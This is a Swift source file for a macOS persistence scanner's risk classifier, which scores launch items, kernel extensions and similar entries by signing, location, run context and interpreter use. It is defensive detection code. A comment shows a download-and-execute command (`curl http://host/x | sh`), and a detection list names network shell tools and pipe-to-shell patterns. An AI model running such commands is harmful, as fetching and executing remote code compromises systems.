import Foundation

/// Classifies the risk level for a persistence item by evaluating
/// independent risk dimensions and combining them into a final assessment.
///
/// Each dimension—signing trust, mechanism severity, execution context,
/// filesystem location, temporal signals, and content signals—produces
/// its own risk level and explanatory reasons. The classifier then applies
/// trust-based capping rules:
///
/// - Apple-signed items in system paths → capped at `.informational`
/// - Apple-signed items elsewhere → capped at `.low`
/// - Signed + notarized items → capped at `.low` unless a hard override applies
/// - Non-notarized root items at boot → explicitly escalated
///
/// This produces consistent, explainable risk labels where notarized items
/// from known developers stay low-risk, while unsigned or ad-hoc binaries
/// running as root at boot are appropriately flagged.
public struct RiskClassifier: Sendable {

    public init() {}

    // MARK: - Public API

    /// The outcome of classifying one item.
    public struct Assessment: Sendable {
        public let level: RiskLevel
        /// Findings arguing the item is risky.
        public let reasons: [String]
        /// Facts arguing it is benign, kept separate so they are not rendered as
        /// warnings next to a Critical badge.
        public let mitigations: [String]

        public init(level: RiskLevel, reasons: [String], mitigations: [String] = []) {
            self.level = level
            self.reasons = reasons
            self.mitigations = mitigations
        }
    }

    /// Classify a persistence item and return the final risk level with reasons.
    public func classify(_ item: PersistenceItem) -> Assessment {
        // Evaluate each independent risk dimension
        let signing = classifySigningTrust(
            item.signingInfo,
            hasExecutable: item.executablePath != nil,
            category: item.category
        )
        var mechanism = classifyMechanismSeverity(item.category)
        if item.category == .launchDaemons,
           let user = item.rawMetadata["UserName"]?.stringValue, user != "root" {
            // The generic wording claims root; say who it actually runs as.
            mechanism.reasons = ["System-wide daemon, runs as user \u{201C}\(user)\u{201D}"]
        }
        let context = classifyExecutionContext(
            runContext: item.runContext,
            owner: item.owner,
            signing: item.signingInfo,
            isAppleOwned: item.isOnSealedSystemVolume
        )
        let location = classifyLocation(
            configPath: item.configPath,
            executablePath: item.executablePath,
            arguments: item.arguments,
            category: item.category
        )
        let temporal = classifyTemporalSignals(
            timestamps: item.timestamps,
            configPath: item.configPath,
            isAppleProvided: item.source.isApple || item.isOnSealedSystemVolume
                || (item.signingInfo?.isAppleSigned ?? false)
        )
        let content = classifyContentSignals(
            category: item.category,
            rawMetadata: item.rawMetadata
        )
        let interpreter = classifyInterpreterUse(item)
        let entitlements = classifyEntitlements(item.signingInfo)

        // Collect all reasons from every dimension
        var allReasons: [String] = []
        allReasons.append(contentsOf: signing.reasons)
        allReasons.append(contentsOf: mechanism.reasons)
        allReasons.append(contentsOf: context.reasons)
        allReasons.append(contentsOf: location.reasons)
        allReasons.append(contentsOf: temporal.reasons)
        allReasons.append(contentsOf: content.reasons)
        allReasons.append(contentsOf: interpreter.reasons)
        allReasons.append(contentsOf: entitlements.reasons)

        // Include scanner-provided reasons (e.g., suspicious shell profile patterns)
        allReasons.append(contentsOf: item.riskReasons)

        var mitigations = signing.mitigations
        mitigations.append(contentsOf: item.riskMitigations)

        // Compute the raw maximum across all dimensions.
        // Scanner-set riskLevel is only included when the scanner provided
        // specific reasons — this avoids the default .medium inflating items
        // that scanners didn't explicitly flag.
        var dimensionLevels = [
            signing.level,
            mechanism.level,
            context.level,
            location.level,
            temporal.level,
            content.level,
            interpreter.level,
            entitlements.level,
        ]
        if !item.riskReasons.isEmpty {
            dimensionLevels.append(item.riskLevel)
        }

        // Mechanism severity describes what a mechanism *could* do, not what this
        // item is doing, so it must not drive the verdict on its own.
        //
        // Without this, every stock `/etc/pam.d` file scored High purely for being
        // a PAM config, and every Apple kernel extension scored High for being a
        // kext — burying the handful that actually reference a non-Apple module or
        // ship unsigned. The mechanism still escalates normally as soon as any real
        // evidence appears.
        let evidence = [
            signing.level, context.level, location.level, temporal.level,
            content.level, interpreter.level, entitlements.level,
        ].max() ?? .informational

        var rawMax = dimensionLevels.max() ?? .medium

        if Self.selfEvidentCategories.contains(item.category) {
            // No gating: the mechanism is the evidence.
        } else if evidence == .informational {
            // Nothing was actually found. A powerful mechanism in a clean state is
            // worth listing, not worth alarming about.
            rawMax = min(rawMax, .low)
        } else if evidence <= .low {
            rawMax = min(rawMax, .medium)
        }

        // Apply trust-based capping
        var finalLevel = applyTrustCapping(
            rawLevel: rawMax,
            item: item,
            locationLevel: location.level,
            interpreterLevel: interpreter.level,
            entitlementLevel: entitlements.level
        )

        // An item the system will not run is a finding worth keeping, but it is
        // not an active threat. Demote it one level and say so, rather than
        // inflating the headline counts with entries that cannot execute.
        if !item.isEnabled, finalLevel > .informational {
            finalLevel = finalLevel.demoted
            mitigations.append("Currently disabled — will not run until re-enabled")
        }

        return Assessment(level: finalLevel, reasons: allReasons, mitigations: mitigations)
    }

    // MARK: - Dimension: Signing Trust

    /// Categories whose *presence alone* is the finding.
    ///
    /// For these, there is nothing further to corroborate: a `DYLD_INSERT_LIBRARIES`
    /// entry existing at all is the problem, a process with no binary on disk is the
    /// problem, and macOS no longer creates login hooks, StartupItems, rc scripts,
    /// emond rules or Dashboard widgets — so anything found in those locations was
    /// put there by something other than the operating system. These are therefore
    /// exempt from the evidence gate that stops mechanism severity from driving a
    /// verdict by itself.
    static let selfEvidentCategories: Set<PersistenceCategory> = [
        .dylibInjection, .filelessProcesses,
        .loginHooks, .startupItems, .rcScripts, .emondRules, .widgets,
    ]

    /// Categories where the "executable" is a script or text file, not a
    /// compiled Mach-O binary. Code signing is not applicable — unsigned
    /// status is expected and not a risk indicator. Risk for these items
    /// comes from mechanism severity and content analysis instead.
    private static let scriptCategories: Set<PersistenceCategory> = [
        .shellProfiles, .periodicTasks, .rcScripts, .emondRules
    ]

    /// Evaluate risk based on code signing status.
    ///
    /// Order matters. Ad-hoc signing is checked *before* notarization: an ad-hoc
    /// signature is valid-but-anonymous, so `isSigned && !isNotarized` would
    /// otherwise match first and report a classic malware indicator as a mild
    /// "signed but not notarized".
    func classifySigningTrust(
        _ signing: SigningInfo?,
        hasExecutable: Bool,
        category: PersistenceCategory
    ) -> (level: RiskLevel, reasons: [String], mitigations: [String]) {
        // Script-based items can't be code-signed — don't penalize.
        // If signing somehow reports signed (binary target in a script category),
        // fall through to normal checks.
        if Self.scriptCategories.contains(category) {
            guard let signing = signing, signing.isSigned else {
                return (.informational, [], [])
            }
        }

        guard let signing = signing else {
            if hasExecutable {
                return (.medium, ["Code signing could not be verified"], [])
            }
            return (.informational, [], [])
        }

        // Ad-hoc first: a signature with no identity behind it is a classic malware
        // indicator, and it must be named as such rather than falling through to
        // the milder "signed but not notarized" or generic "unsigned" wording.
        if signing.isAdHocSigned {
            return (.high, ["Ad-hoc signed — signature carries no developer identity"], [])
        }

        if !signing.isSigned {
            return (.high, ["Unsigned binary — no verifiable author"], [])
        }

        if signing.isAppleSigned {
            return (.informational, [], ["Signed by Apple"])
        }

        if signing.isNotarized {
            var mitigations = ["Notarized by Apple"]
            if let team = signing.teamIdentifier {
                mitigations.append("Signed by team \(team)")
            }
            return (.low, [], mitigations)
        }

        var mitigations: [String] = []
        if let team = signing.teamIdentifier {
            mitigations.append("Signed by team \(team)")
        }
        return (.medium, ["Signed but not notarized"], mitigations)
    }

    // MARK: - Dimension: Interpreter use

    /// Evaluate an item whose registered executable is a general-purpose
    /// interpreter.
    ///
    /// This is the single most common shape of real macOS persistence:
    /// `ProgramArguments = ["/bin/sh", "-c", "curl http://host/x | sh"]`. The
    /// executable is Apple-signed and lives in a system directory, so every
    /// identity- and location-based dimension reports "clean" while the code that
    /// actually runs is never examined.
    func classifyInterpreterUse(
        _ item: PersistenceItem
    ) -> (level: RiskLevel, reasons: [String]) {
        guard let payload = item.interpretedPayload else { return (.informational, []) }
        // Shell profiles and periodic scripts *are* scripts; the interpreter is
        // the point, and their content is analyzed by their own scanners.
        guard !Self.scriptCategories.contains(item.category) else {
            return (.informational, [])
        }

        let interpreter = (item.executablePath ?? "").isEmpty
            ? "an interpreter"
            : ((item.executablePath ?? "") as NSString).lastPathComponent

        switch payload {
        case .inlineScript(let body):
            var level: RiskLevel = .high
            var reasons = [
                "Runs an inline \(interpreter) command rather than a signed binary"
            ]
            if let suspicious = Self.suspiciousCommandReason(body) {
                level = .critical
                reasons.append(suspicious)
            }
            reasons.append("Command: \(Self.truncate(body, to: 160))")
            return (level, reasons)

        case .script(let path):
            var level: RiskLevel = .medium
            var reasons = ["Runs a \(interpreter) script rather than a signed binary"]

            if PathUtilities.isInWorldWritableDirectory(path) {
                level = .critical
                reasons.append("Script is in a world-writable directory: \(path)")
            } else if !PathUtilities.isAppleOwnedPath(path), PathUtilities.isWritableByNonRoot(path) {
                level = .high
                reasons.append("Script is writable by a non-root user: \(path)")
            }
            if !PathUtilities.exists(path) {
                if level < .medium { level = .medium }
                reasons.append("Referenced script does not exist (orphaned): \(path)")
            }
            return (level, reasons)
        }
    }

    /// Hallmarks of a download-and-execute or hide-from-view payload.
    private static func suspiciousCommandReason(_ body: String) -> String? {
        let lowered = body.lowercased()
        let networkTools = ["curl ", "wget ", "nscurl ", "/dev/tcp/", "nc ", "ncat "]
        let executors = ["| sh", "|sh", "| bash", "|bash", "| zsh", "|zsh",
                         "eval ", "osascript", "base64 -d", "base64 --decode"]

        let fetches = networkTools.contains { lowered.contains($0) }
        let executes = executors.contains { lowered.contains($0) }

        if fetches && executes {
            return "Downloads and executes remote code"
        }
        if fetches {
            return "Contacts the network on execution"
        }
        if lowered.contains("base64 -d") || lowered.contains("base64 --decode") {
            return "Decodes and runs obfuscated content"
        }
        if lowered.contains("eval ") {
            return "Evaluates dynamically constructed code"
        }
        return nil
    }

    private static func truncate(_ text: String, to limit: Int) -> String {
        let collapsed = text.replacingOccurrences(of: "\n", with: " ")
        guard collapsed.count > limit else { return collapsed }
        return String(collapsed.prefix(limit - 1)) + "…"
    }

    // MARK: - Dimension: Entitlements

    /// Evaluate entitlements that widen the binary's attack surface.
    ///
    /// Without this, notarization caps risk at `.low` for a binary that has
    /// explicitly opted out of library validation — which is precisely the
    /// configuration that makes it a viable injection target.
    func classifyEntitlements(
        _ signing: SigningInfo?
    ) -> (level: RiskLevel, reasons: [String]) {
        guard let entitlements = signing?.entitlements, !entitlements.isEmpty else {
            return (.informational, [])
        }

        var level: RiskLevel = .low
        var reasons: [String] = []

        for entitlement in entitlements {
            switch entitlement {
            case "com.apple.security.cs.disable-library-validation":
                level = max(level, .medium)
                reasons.append("Library validation disabled — can load unsigned code")
            case "com.apple.security.cs.allow-dyld-environment-variables":
                level = max(level, .medium)
                reasons.append("Accepts dyld environment variables — injectable")
            case "com.apple.security.cs.allow-unsigned-executable-memory",
                 "com.apple.security.cs.disable-executable-page-protection":
                level = max(level, .medium)
                reasons.append("Executable memory protections relaxed")
            case "com.apple.security.get-task-allow", "com.apple.security.cs.debugger":
                level = max(level, .medium)
                reasons.append("Debuggable — another process can inspect or modify it")
            default:
                if entitlement.hasPrefix("com.apple.private.") {
                    level = max(level, .low)
                    reasons.append("Uses private Apple entitlement: \(entitlement)")
                }
            }
        }

        return (level, reasons)
    }

    // MARK: - Dimension: Mechanism Severity

    /// Evaluate the inherent risk of the persistence mechanism category.
    /// This represents how dangerous the mechanism is by design, regardless
    /// of who authored it or how it's signed.
    func classifyMechanismSeverity(
        _ category: PersistenceCategory
    ) -> (level: RiskLevel, reasons: [String]) {
        let level: RiskLevel
        var reasons: [String] = []

        switch category {
        // -- Critical: direct code injection vectors --
        case .dylibInjection:
            level = .critical
            reasons.append("Dynamic library injection vector")
        case .filelessProcesses:
            level = .critical
            reasons.append("Process running without backing binary on disk")

        // -- High: kernel/root-level access or auth interception --
        case .kernelExtensions:
            level = .high
            reasons.append("Kernel-level code execution")
        case .pamModules:
            level = .high
            reasons.append("Authentication module — can intercept credentials")
        case .authorizationPlugins:
            level = .high
            reasons.append("Runs in the authentication chain")
        case .scriptingAdditions:
            level = .high
            reasons.append("Code injected into AppleScript host processes")
        case .launchDaemons:
            level = .high
            // Not "at system boot": many daemons are on-demand (socket, Mach
            // service or schedule) rather than `RunAtLoad`.
            reasons.append("System-wide daemon, runs as root unless the plist names another user")

        // -- Medium: significant persistence or notable privilege --
        case .launchAgents:
            level = .medium
        case .cronJobs:
            level = .medium
        case .emondRules:
            level = .medium
            reasons.append("Event-triggered execution")
        case .shellProfiles:
            level = .medium
        case .systemExtensions:
            level = .medium
        case .directoryServicesPlugins:
            level = .medium
            reasons.append("Directory services plugin")
        case .privilegedHelperTools:
            level = .medium
            reasons.append("Privileged helper with elevated access")
        case .inputMethods:
            level = .medium
            reasons.append("Input method — can observe keystrokes")
        case .networkScripts:
            level = .medium

        // -- Medium-via-deprecation: deprecated mechanisms are escalated --
        case .loginHooks:
            level = .high
            reasons.append("Uses deprecated persistence mechanism")
        case .startupItems:
            level = .high
            reasons.append("Uses deprecated persistence mechanism")
        case .rcScripts:
            level = .high
            reasons.append("Uses deprecated persistence mechanism")

        // -- Low: standard, well-understood persistence --
        case .loginItems:
            level = .low
        case .backgroundTaskManagement:
            level = .low
        case .configurationProfiles:
            level = .low
        case .browserExtensions:
            level = .low
        case .appExtensions:
            level = .low
        case .xpcServices:
            level = .low
        case .folderActions:
            level = .low
        case .automatorWorkflows:
            level = .low

        // -- Informational: passive or minimal-risk mechanisms --
        case .periodicTasks:
            level = .informational
        case .spotlightImporters:
            level = .informational
        case .quickLookGenerators:
            level = .informational
        case .screenSavers:
            level = .informational
        case .audioPlugins:
            level = .informational
        case .printerPlugins:
            level = .informational
        case .reopenAtLogin:
            level = .informational
        case .widgets:
            level = .low
            reasons.append("Uses deprecated persistence mechanism")
        case .dockTilePlugins:
            level = .informational
        }

        return (level, reasons)
    }

    // MARK: - Dimension: Execution Context

    /// Evaluate risk from the combination of run context and ownership.
    /// Non-notarized items running as root at boot are explicitly escalated.
    func classifyExecutionContext(
        runContext: RunContext,
        owner: ItemOwner,
        signing: SigningInfo?,
        isAppleOwned: Bool = false
    ) -> (level: RiskLevel, reasons: [String]) {
        let isRoot: Bool = {
            if case .system = owner { return true }
            return false
        }()
        let isNotarized = signing?.isNotarized ?? false
        let isApple = signing?.isAppleSigned ?? false || isAppleOwned

        // Apple's own software doesn't get context escalation. `isAppleOwned`
        // covers sealed-volume content that has no separate binary to verify —
        // without it every Apple kernel extension was escalated for "running as
        // root at boot", which is simply what those are for.
        if isApple { return (.informational, []) }

        var level: RiskLevel = .informational
        var reasons: [String] = []

        switch runContext {
        case .boot:
            if isRoot && !isNotarized {
                level = .high
                reasons.append("Non-notarized item runs as root at boot")
            } else if isRoot {
                level = .medium
            } else {
                level = .low
            }
        case .always:
            if isRoot && !isNotarized {
                level = .high
                reasons.append("Non-notarized always-running root process")
            } else if isRoot {
                level = .medium
            } else {
                level = .low
            }
        case .login:
            level = .low
        case .scheduled:
            level = .low
        case .triggered:
            level = .low
        case .onDemand:
            level = .informational
        case .manual:
            level = .informational
        case .unknown:
            level = .low
        }

        return (level, reasons)
    }

    // MARK: - Dimension: Location

    /// Categories whose canonical location *is* a dotfile, so "hidden" carries no
    /// signal. `~/.zshrc` being hidden is not a finding; flagging it on every
    /// shell profile trains users to ignore the reason list.
    private static let dotfileCategories: Set<PersistenceCategory> = [
        .shellProfiles, .dylibInjection, .reopenAtLogin
    ]

    /// Evaluate risk from filesystem location of the config and executable.
    ///
    /// `arguments` is inspected as well: a launchd item can reference a payload in
    /// `/tmp` purely through its arguments, which the executable path alone
    /// never reveals.
    func classifyLocation(
        configPath: String?,
        executablePath: String?,
        arguments: [String] = [],
        category: PersistenceCategory? = nil
    ) -> (level: RiskLevel, reasons: [String]) {
        var level: RiskLevel = .informational
        var reasons: [String] = []

        if let exec = executablePath {
            if PathUtilities.isInWorldWritableDirectory(exec) {
                level = .critical
                reasons.append("Executable in world-writable directory: \(exec)")
            }

            if !PathUtilities.exists(exec) {
                if level < .medium { level = .medium }
                reasons.append("Referenced executable does not exist (orphaned)")
            }
        }

        // Path-shaped arguments pointing somewhere anyone can write.
        for argument in arguments.dropFirst() where argument.hasPrefix("/") {
            if PathUtilities.isInWorldWritableDirectory(argument) {
                level = .critical
                reasons.append("Argument references a world-writable path: \(argument)")
                break
            }
        }

        if let config = configPath {
            let isDotfileCategory = category.map(Self.dotfileCategories.contains) ?? false
            if PathUtilities.isHidden(config), !isDotfileCategory {
                level = level.escalated
                reasons.append("Hidden config file: \(config)")
            }

            if PathUtilities.isSystemPath(config) && PathUtilities.isWritableByNonRoot(config) {
                level = .critical
                reasons.append("System path writable by a non-root user: \(config)")
            }
        }

        return (level, reasons)
    }

    // MARK: - Dimension: Temporal Signals

    /// Evaluate risk from file modification timestamps.
    func classifyTemporalSignals(
        timestamps: ItemTimestamps,
        configPath: String?,
        isAppleProvided: Bool = false
    ) -> (level: RiskLevel, reasons: [String]) {
        // A macOS update rewrites hundreds of files under /etc and /usr. Flagging
        // Apple's own content for having a recent mtime turned every system update
        // into a wall of identical findings.
        guard !isAppleProvided else { return (.informational, []) }

        guard let modified = timestamps.modified else {
            return (.informational, [])
        }

        let thirtyDaysAgo = Date().addingTimeInterval(-30 * 24 * 60 * 60)
        guard modified > thirtyDaysAgo, let config = configPath else {
            return (.informational, [])
        }

        // Apple-owned locations are excluded. `/System` is on the sealed system
        // volume and `/Library/Apple` is delivered by Apple's own updater, so a
        // recent mtime there means a macOS update happened — not that anything was
        // tampered with. Including them made a routine system update light up
        // several hundred rows with "System file modified recently", which is pure
        // noise and trains the reader to ignore the reason list.
        guard PathUtilities.isSystemPath(config),
              !PathUtilities.isAppleOwnedPath(config) else {
            return (.informational, [])
        }

        // `.low`, not `.medium`: recency is context, not a finding. A macOS update
        // touches hundreds of files under /etc, and letting a timestamp alone push
        // an item to Medium produced a wall of identical rows after every update.
        // Combined with a real finding it still raises the total.
        return (.low, [
            "Modified recently (\(modified.formatted(.dateTime.month().day())))"
        ])
    }

    // MARK: - Dimension: Content Signals

    /// Evaluate risk from item metadata and content-specific indicators.
    func classifyContentSignals(
        category: PersistenceCategory,
        rawMetadata: [String: PlistValue]
    ) -> (level: RiskLevel, reasons: [String]) {
        // InputManagers (deprecated input method mechanism) are a known malware vector
        if category == .inputMethods {
            if let deprecated = rawMetadata["Deprecated"]?.boolValue, deprecated {
                return (.critical, ["InputManagers are a known malware vector"])
            }
        }

        return (.informational, [])
    }

    // MARK: - Trust Capping

    /// Apply trust-based capping rules to the raw risk level.
    ///
    /// Trusted code signing attenuates risk: a properly signed and notarized
    /// binary from a known developer is inherently less suspicious than an
    /// unsigned one, even if the mechanism it uses is powerful.
    ///
    /// Hard overrides (world-writable locations, DYLD injection) bypass
    /// capping because the location or mechanism danger is independent of
    /// who signed the binary.
    /// Whether a critical location finding concerns the item's own files rather
    /// than only a path passed to it as an argument.
    ///
    /// A world-writable argument matters when someone else chose it: a
    /// third-party plist pointing at `/tmp/payload` is classic persistence. In a
    /// plist on the sealed system volume the argument is Apple's own choice and
    /// cannot be changed, so on its own it is a data directory, not a payload.
    /// `com.apple.kdumpd`, which writes kernel panic dumps to `/var/tmp/PanicDumps`,
    /// scored High for this and so could never be hidden as an Apple item.
    /// Interpreter-fronted items are handled separately, since there the argument
    /// is the code that runs.
    private static func hasNonArgumentLocationFinding(_ item: PersistenceItem) -> Bool {
        if let exec = item.executablePath, PathUtilities.isInWorldWritableDirectory(exec) {
            return true
        }
        if let config = item.configPath,
           PathUtilities.isSystemPath(config), PathUtilities.isWritableByNonRoot(config) {
            return true
        }
        return false
    }

    private func applyTrustCapping(
        rawLevel: RiskLevel,
        item: PersistenceItem,
        locationLevel: RiskLevel,
        interpreterLevel: RiskLevel,
        entitlementLevel: RiskLevel
    ) -> RiskLevel {
        // Content on the sealed system volume has no separate executable to verify,
        // but SIP guarantees it has not been modified. Without this, every Apple
        // kernel extension and PAM module came back High purely because there was
        // no signature to cap on.
        let locationOverrides = locationLevel >= .critical
            && (!item.isOnSealedSystemVolume || Self.hasNonArgumentLocationFinding(item))

        if item.isOnSealedSystemVolume, !item.isInterpreterFronted {
            let hasOverride = locationOverrides || interpreterLevel >= .medium
            return hasOverride ? rawLevel : min(rawLevel, .informational)
        }

        guard let signing = item.signingInfo else { return rawLevel }

        // Hard overrides that bypass trust capping: the danger is not about
        // identity but about what the item does or where it lives.
        //
        // The interpreter case is essential — an Apple-signed `/bin/sh` running
        // an attacker's inline command would otherwise be capped to
        // `.informational` because the *binary* is Apple's.
        let hasHardOverride = locationOverrides
            || item.category == .dylibInjection
            || item.category == .filelessProcesses
            || item.isInterpreterFronted
            || interpreterLevel >= .medium
            || entitlementLevel >= .medium

        if hasHardOverride { return rawLevel }

        if signing.isAppleSigned {
            // Apple's binary, registered by Apple's own configuration, or a
            // bundle whose configuration is sealed by Apple's signature.
            if let config = item.configPath,
               PathUtilities.isAppleOwnedPath(config) || item.isConfigCoveredBySignature {
                return min(rawLevel, .informational)
            }
            // Apple's binary registered from somewhere else: still trustworthy
            // code, but a third party chose to run it. Cap, never raise.
            return min(rawLevel, .low)
        }

        if signing.isNotarized {
            return min(rawLevel, .low)
        }

        return rawLevel
    }
}
